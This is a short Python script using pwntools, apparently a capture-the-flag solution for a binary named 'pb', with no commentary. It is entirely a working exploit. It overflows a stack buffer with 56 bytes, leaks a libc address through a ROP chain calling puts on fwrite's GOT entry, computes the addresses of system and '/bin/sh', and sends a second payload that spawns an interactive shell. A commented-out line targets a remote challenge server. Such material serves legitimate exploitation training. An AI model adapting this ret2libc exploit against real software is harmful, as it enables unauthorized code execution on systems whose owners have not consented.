import pwn
from pwn import *
context.log_level = 'DEBUG'
context.binary = "pb"
p = process("./pb")
#p = remote("68.183.45.143",31486)
overwrite = b"A"*56
pop_rdi = p64(0x000000000040142b)
fwrite_at_got = p64(0x403fe8)
puts_at_plt = p64(0x401030)
safe_main = p64(0x00000000004013a6)
libc = ELF("./glibc/libc.so.6")
p.sendlineafter(b">> ",b"2")
payload = overwrite + pop_rdi + fwrite_at_got + puts_at_plt + safe_main
p.sendlineafter(b": ",payload)
p.recvuntil(b"you!")
leak = u64(p.recv(8).strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

libc_base = leak - libc.sym["fwrite"]
system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
ret = p64(0x0000000000401016)
p.sendlineafter(b">> ",b"2")
payload2 = overwrite + ret + pop_rdi + p64(bin_sh) + p64(system)
p.sendlineafter(b": ",payload2)
p.interactive()
